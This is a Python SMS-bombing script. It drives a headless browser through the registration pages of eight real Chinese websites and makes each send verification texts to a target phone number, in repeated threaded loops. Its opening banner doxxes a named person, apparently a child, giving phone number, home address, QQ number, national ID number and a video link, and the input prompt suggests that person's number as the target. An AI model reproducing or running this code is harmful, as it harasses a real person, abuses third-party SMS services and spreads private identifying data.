a = '''
                                                                                                                                           
                                                                                                                                           
                                                                                                                                           
                                                                                                                                           
               $$                                                                  $             $    $  $    $            $$$             
               $$                 $$$$$$$$$$$$$$$       $            $$            $$            $$$$$$$ $$$$$$$           $$$             
               $$ $$$$$$$$$$       $$$$$$$$$$$$$$$      $$$$$$$$$$$$$$$$           $$            $$$$$$$ $$$$$$$           $$       $$     
               $$  $$$$$$$$              $$             $$$$$$$$$$$$$$$$           $$            $$   $$ $$   $$    $$$$$$$$$$$$$$$$$$$    
            $$$$$$$$$   $                $$             $$            $            $$            $$   $$ $$   $$    $$$$$$$$$$$$$$$$$$$    
            $$$$$$$$$ $$                 $$      $      $$$$$$$$$$$$$$$$       $$  $$ $          $$$$$$$ $$$$$$$          $$               
               $$    $$    $    $$$$$$$$$$$$$$$$$$$     $$$$$$$$$$$$$$$$      $$$  $$  $         $$$$$$$ $$$$$$$          $$               
              $$$   $$$$$$$$$$   $$$$$$$$$$$$$$$$$$     $$    $$   $          $$   $$   $        $$   $$ $$   $$          $$$$$$$$$$       
              $$$$$$$$$$$$$$$            $$             $$    $$$$$$$        $$    $$   $$       $$   $$ $$   $$          $$$$$$$$$        
             $$$$$$  $$ $$ $$           $$$             $$    $$$$$$$        $$    $$    $$      $$$$$$$ $$$$$$$         $$$$    $$        
             $$$$$$ $$  $  $$           $$$$            $$    $    $$        $     $$     $$     $$$$$$$ $$$$$$$         $$$$   $$         
             $ $$   $$ $$  $$           $$ $            $     $    $$       $$     $$     $$     $$   $$ $$   $$        $$  $   $$         
            $  $$  $$  $$  $           $$  $$           $    $$    $$       $      $$      $$    $$   $$ $    $$        $$  $$ $$          
           $$  $$ $$  $$   $           $$   $$         $$    $$    $$      $$      $$      $$    $    $$ $    $$       $$    $$$$          
           $   $$$$   $$  $$          $$    $$$        $$   $$     $      $$       $$           $$    $$$$    $$      $$      $$           
               $$$   $$   $$         $$      $$$      $$   $$      $      $        $$           $$ $$ $$$$    $$      $$     $$$$$         
               $$  $$$$$  $$       $$$        $$$$$   $$  $$   $$$$$            $  $$           $   $$$$$  $$ $$     $$    $$$  $$$$$$$    
               $$ $$   $$$$$     $$$           $$$   $$ $$$      $$             $$$$$          $     $$$    $$$$    $$  $$$$      $$$$     
               $$$      $$$     $$                   $  $                         $$          $$      $      $$       $$$                  
                                                                                                                                           
   你好                                                                                                                                        
***************                                                                                                                                            
电话号码:18387759024
姓名:杨天历
家庭住址:云南省晋洱市墨江县
学历:幼儿园
学校:墨江县育稚幼儿园 
QQ号:3556276945 
身份证号：530842201805238948
邮政:665000
区号:0879
区划代码:530800
使用:中国移动
开合标码(创):1987046ASD614MNB613491E1A
***************** 
￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥444444
Q1： 我为什么要做这个题目？
A1：（1） 因为我想看看自己是否真的能把Python语言学好

    （2） 【一个人黑了BA的四个角色，又将丑化的魔爪伸向了白洲梓! !（曝光）】 https://www.bilibili.com/video/BV1DkYSePEvw/?share_source=copy_web&vd_source=25389b9f55883821934be7e15069af1b
        快手号:xqdh114514
        B站UID：3546664100956462

    （3） 为了我的白洲梓，我想做一个有用的工具。
￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥￥�
    

    '''
print(a)

import time
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.options import Options
from selenium.webdriver.edge.service import Service

# 设置浏览器选项，可以选择是否以无头模式运行
def setup_browser(headless=True):
    option = Options()
    if headless:
        option.add_argument('headless')
    edge_driver_path = r'C:\Drivers\edgedriver_win64\msedgedriver.exe'  # 请替换为你的EdgeDriver路径
    service = Service(edge_driver_path)
    return webdriver.Edge(service=service, options=option)
17
# 发送短信的通用函数，接受浏览器实例、URL、查找元素的方式、元素值、手机号、点击元素的方式、点击元素的值以及睡眠时间作为参数
def send_sms(browser, url, find_by, value, phon_num, click_by, click_value, sleep_time=5):
    try:
        browser.get(url)
        browser.find_element(find_by, value).send_keys(phon_num)
        browser.find_element(click_by, click_value).click()
        time.sleep(sleep_time)
    except Exception as e:
        print(f"Error sending SMS: {e}")
    finally:
        browser.close()

# 向360网站发送短信
def send_360(phon_num):
    send_sms(setup_browser(), 'https://www.360jie.com.cn/', By.NAME, "mobile", phon_num, By.ID, 'btnSendCode1')

# 向饿了么网站发送短信
def send_ele(phon_num):
    send_sms(setup_browser(), 'https://open.shop.ele.me/openapi/register', By.CLASS_NAME, 'el-input__inner', phon_num, By.CLASS_NAME, 'btn-verifyCode', sleep_time=4)

# 向凤凰网发送短信
def send_fenghuang(phon_num):
    send_sms(setup_browser(), 'https://www.fengwd.com/', By.ID, 'mobile_number', phon_num, By.XPATH, "//*[@class='get-sms-captcha blue']", sleep_time=4)

# 向四川航空网站发送短信
def send_sichuanair(phon_num):
    send_sms(setup_browser(), 'http://flights.sichuanair.com/3uair/ibe/profile/createProfile.do', By.NAME, 'mobilePhone', phon_num, By.ID, 'sendSmsCode', sleep_time=6)

# 向昆明航空网站发送短信
def send_airkunming(phon_num):
    send_sms(setup_browser(), 'https://www.airkunming.com/#/user/register', By.ID, 'mobile', phon_num, By.XPATH, "//*[@class='sms-code']", sleep_time=4)

# 向有赞网站发送短信
def send_youzan(phon_num):
    send_sms(setup_browser(), 'https://console.youzanyun.com/register', By.XPATH, "//*[@class = 'zent-input phone']", phon_num, By.XPATH, "//*[@class = 'sms-btn']", sleep_time=4)

# 向安徽相亲网发送短信
def send_anhuixiangiqn(phon_num):
    send_sms(setup_browser(), 'http://www.ahxiangqin.cn/index.php?c=passport&a=reg', By.NAME, 'mobile', phon_num, By.XPATH, "//*[@class = 'action-send-mobile-code get']", sleep_time=4)

# 向我主良缘网站发送短信
def send_wozhuliangyuan(phon_num):
    browser = setup_browser()
    try:
        browser.get('http://m.7799520.com/register.html')
        browser.find_element(By.NAME, 'mobile').send_keys(phon_num)
        buttons = browser.find_elements(By.TAG_NAME, 'button')
        for button in buttons:
            button.click()
            time.sleep(2)
    except Exception as e:
        print(f"Error sending SMS: {e}")
    finally:
        browser.close()

# 主函数，接受用户输入的手机号和轰炸循环次数，然后启动多个线程发送短信
if __name__ == "__main__":
    try:
        phon_num = input('请输入手机号 （s人手机号：18387759024）: ')
        run_roll = int(input('轰炸循环次数: '))
        functions = [send_360, send_ele, send_fenghuang, send_sichuanair, send_airkunming, send_youzan, send_anhuixiangiqn, send_wozhuliangyuan]
        for _ in range(run_roll):
            threads = [threading.Thread(target=func, args=(phon_num,)) for func in functions]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            time.sleep(4)
    except Exception as e:
        print(f"Error in main function: {e}")

